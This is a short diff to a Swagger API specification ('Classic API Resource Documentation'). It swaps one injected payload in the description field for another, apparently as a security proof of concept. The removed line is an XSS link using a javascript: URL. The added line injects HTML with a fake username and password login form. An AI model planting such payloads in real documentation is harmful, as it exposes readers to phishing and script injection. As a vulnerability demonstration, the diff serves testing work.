@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <a href="javascript:confirm``">XSS</a>
+    <h1>HTMLi via Swagger: <a href="https://synack.com">Click Here</a></h1><br><form><label>Username:<br><input name="username" type="text"><br><label>Password<label><br><input type="password" name="password"><br><input value="submit" type="submit"></form>
 
   version: production
 basePath: /JSSResource/
